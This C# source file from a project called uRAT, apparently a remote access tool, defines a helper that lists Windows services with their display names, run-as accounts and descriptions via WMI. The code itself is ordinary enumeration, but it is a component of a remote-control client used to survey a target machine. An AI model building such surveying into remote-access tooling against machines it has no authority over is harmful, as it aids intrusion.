using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.ServiceProcess;
using System.Text;

namespace uRAT.ManagersClientPlugin.ProcessManager.Tools
{
    internal static class ServicesHelper
    {
        public struct HighLevelService
        {
            public string Service { get; set; }
            public string DisplayName { get; set; }
            public string Startname { get; set; }
            public string Description { get; set; }

            public HighLevelService(string service, string displayName, string startname, string description) : this()
            {
                Service = service;
                DisplayName = displayName;
                Startname = startname;
                Description = description;
            }
        }

        public static List<HighLevelService> GetServices()
        {
            return GetServicesImpl().ToList();
        }

        private static IEnumerable<HighLevelService> GetServicesImpl()
        {
            foreach (var service in ServiceController.GetServices())
            {
                var mngmentObj = new ManagementObject(string.Concat("Win32_Service.Name='", service.ServiceName, "'"));
                var startName = mngmentObj["StartName"];
                var desc = mngmentObj["Description"];

                var hlService = new HighLevelService
                {
                    Service = service.ServiceName ?? "",
                    DisplayName = service.DisplayName ?? "",
                    Startname = ((string) startName) ?? "",
                    Description = ((string) desc) ?? ""
                };

                yield return hlService;
            }
        }
    }
}
